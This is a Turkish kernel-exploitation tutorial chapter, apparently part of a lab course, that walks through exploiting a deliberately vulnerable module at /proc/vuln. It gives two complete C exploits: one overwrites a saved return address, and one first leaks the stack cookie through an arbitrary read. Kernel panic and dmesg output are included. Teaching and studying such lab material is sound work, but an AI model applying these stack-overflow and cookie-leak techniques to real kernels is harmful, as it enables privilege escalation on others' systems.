# Exploit zamanı
Modülümüzü yüklediğimize göre exploit etmeye geçebiliriz.

İlk exploitimizde amacımız `cant_get_here` fonksiyonunu çağırmak olacak.

Bunun için buffer overflow zafiyetini kullanarak stack üzerinde kaydedilmiş 
olan dönüş adresinin (return adresi) yerine `cant_get_here`ın adresini yazacağız.

### Stack cookiesi neden önemli?
Ancak stack cookielerini dikkate almak zorundayız, buffer overflow'u exploit ederken 
stack şu şekilde görünecektir:
```
local buffer  
---------------
stack cookie  
---------------
return address
```
Burda eğer doğrudan lokal buffer'ı taşırıp, stack cookie'ye rastgele birşeyler yazıp return 
adrese yazmaya geçersek stack cookiesi bozulacağından kernel panikliyecektir.

Bunu deneyip de görebiliriz, fakat önce `cant_get_here` fonksiyonun adresine ihtiyacımız var,
bunun için `/proc/kallsyms`'i kullanabiliriz. `kallsyms` tüm kernel sembollerinin adreslerini 
içeriyor. Bunların arasından `cant_get_here`ın adresini almak adına: `cat /proc/kallsyms | grep cant_get_here`

Bu örnekte `cant_get_here` `ffffffff81094a50` adresinde.

Hadi bu adresi kullanarak basit bir exploit yazalım:
```c
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>

#define DEVICE      "/proc/vuln"

int main(){
    // proc dosyasını okuma ve yazma izinleri ile açıyoruz
    // dosyanın handle'ını fd değişkenine kaydediyoruz
    int fd = open(DEVICE, O_RDWR);

    // yazıcağımız veriyi tutacağımız buffer,
    // long kullanmamızın temel sebebi cookie'nin 8 byte olması 
    // bu sonrasında işimizi kolaylaştıracak
    unsigned long w[3];
    w[0] = 0; // local buffer 
    w[1] = 0; // stack cookie 
    w[2] = (unsigned long)0xffffffff81094a50; // return address 

    puts("Writing payload to "DEVICE);
    // buffer'ı proc dosyasına yazıyoruz 
    write(fd, w, sizeof(w));

    // son olarak dosyayı kapatıyoruz
    close(fd);
}
```
Bu exploiti `gcc -o exploit -static [dosya]` komutu ile derleyip çalıştırırsak beklediğimiz 
kernel paniğe sebep olacaktır:
```
[root@k101 first]# ./exploit
[   85.312183] [vuln] Copied to buffer:
[   85.312213] Kernel panic - not syncing: stack-protector: Kernel stack is corrupted in: procfile_write+0x78/0x80 [vuln]
[   85.317712] CPU: 0 PID: 255 Comm: exploit Tainted: G           O      5.15.135 #1
[   85.318350] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Arch Linux 1.16.2-2-2 04/01/2014
[   85.319143] Call Trace:
[   85.319395]  <TASK>
[   85.319615]  dump_stack_lvl+0x33/0x46
[   85.320003]  panic+0x107/0x2bc
[   85.320304]  ? _printk+0x63/0x7e
[   85.320610]  ? procfile_write+0x78/0x80 [vuln]
[   85.321107]  __stack_chk_fail+0x10/0x10
[   85.321492]  procfile_write+0x78/0x80 [vuln]
[   85.321910]  init_module.cold+0x1a/0x1a [vuln]
[   85.322291]  __cond_resched+0x11/0x40
[   85.322596]  vfs_write+0xb7/0x260
[   85.322872]  ksys_write+0x66/0xe0
[   85.323148]  do_syscall_64+0x3b/0x90
[   85.323455]  entry_SYSCALL_64_after_hwframe+0x62/0xcc
[   85.323869] RIP: 0033:0x410b84
[   85.324125] Code: 89 02 b8 ff ff ff ff eb b5 67 e8 d7 10 00 00 0f 1f 80 00 00 00 00 f3 0f 1e fa 80 3d dd 1e 09 00 00 74 13 b8 01 00 00 00 08
[   85.325677] RSP: 002b:00007fff3a694958 EFLAGS: 00000202 ORIG_RAX: 0000000000000001
[   85.326295] RAX: ffffffffffffffda RBX: 00007fff3a694ab8 RCX: 0000000000410b84
[   85.326887] RDX: 0000000000000018 RSI: 00007fff3a694970 RDI: 0000000000000003
[   85.327468] RBP: 00007fff3a694990 R08: 00000000004a21c0 R09: 0000000000000004
[   85.328059] R10: 0000000000000000 R11: 0000000000000202 R12: 00007fff3a694aa8
[   85.328653] R13: 0000000000000001 R14: 000000000049e2e8 R15: 0000000000000001
[   85.329265]  </TASK>
[   85.329579] Kernel Offset: disabled
[   85.329893] ---[ end Kernel panic - not syncing: stack-protector: Kernel stack is corrupted in: procfile_write+0x78/0x80 [vuln] ]---
```

### Stack cookiesini leaklemek
O halde stack cookie'yi korumamız lazım. Ancak stack cookiesini bilmeden bu mümkün değil - 
stack cookiesini leaklememiz lazım. Bunu yapmak için ikinci zafiyet olan arbitary memory read'i 
kullanacağız. 

Daha iyi açıklamak gerekirse önce arbitary read kullanarak stack'den cookie'yi leakleyeceğiz,
ardından leaklediğimiz cookie ile buffer overflowu gerçekleştireceğiz.

Fakat burda dikkat etmemiz gereken bir nokta lokal buffer'ın arbitary read'i exploit ederken 
32 byte olduğu. Stack cookie'si de 8 byte olduğundan toplam 40 byte okuyacağız. Son 8 byte'daki 
cookie'yi daha sonra yazma bufferına geçebiliriz:
```c
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>

#define DEVICE      "/proc/vuln"

int main(){
    // proc dosyasını okuma ve yazma izinleri ile açıyoruz
    // dosyanın handle'ını fd değişkenine kaydediyoruz
    int fd = open(DEVICE, O_RDWR);

    // yazıcağımız veriyi tutacağımız buffer
    unsigned long w[3];
    // okuyacağımız veriyi tutacağımız buffer 
    // totalde 40 byte okuyacağız
    unsigned long r[5];
    
    read(fd, r, sizeof(r));
    // hex formatında okuduğumuz veriyi ekrana basıyoruz
    for(int i = 0; i < sizeof(r)/8; i++){
        printf("Reading (%d): %lx\n", i, r[i]);
    }
    printf("Cookie leaked! %lx\n", r[4]);

    w[0] = 0; // local buffer 
    // stack cookie okuduğumuz verinin en sonunda yer alacak
    w[1] = r[4]; // stack cookie
    w[2] = (unsigned long)0xffffffff81094a50; // return address 

    puts("Writing payload to "DEVICE);
    // buffer'ı proc dosyasına yazıyoruz 
    write(fd, w, sizeof(w));

    // son olarak dosyayı kapatıyoruz
    close(fd);
}
```
Bu exploit başarı ile cookie'i koruyarak return adresimizin üzerine yazacaktır:
```
[root@k101 first]# ./exploit
Reading (0): 4141414141414141
Reading (1): 4141414141414141
Reading (2): 4141414141414141
Reading (3): 4141414141414141
Reading (4): 17fffed8fde5f100
Cookie leaked! 17fffed8fde5f100 
Writing payload to /proc/vuln
```
Burda ilk 32 byte `A` harfi ile dolu olan lokal bufferımız, ardından gelen `17fffed8fde5f100`
bizim stack cookiemiz, exploit çalıştıktan sonra dmesg çıktısına bakarsak:
```
[  158.068013] [vuln] /proc/vuln created
[  164.520880] [vuln] Reading 40 bytes
[  164.524063] [vuln] Copied to buffer:
[  164.524066] [vuln] How did we get here?
```
`cant_get_here` fonksiyonu çalıştırmayı başardığımızı görebiliriz.

Exploitimiz çalıştı ancak bize herhangi birşey kazandırmadı. Sadece modülümüzdeki erişilemez olan 
bir fonksiyonu çağırdık. Bu şekilde temel fikri aldığımıza göre artık bir root exploiti yazabiliriz.

---
[Önceki](deeper.md) | [Sonraki](ret2root.md)
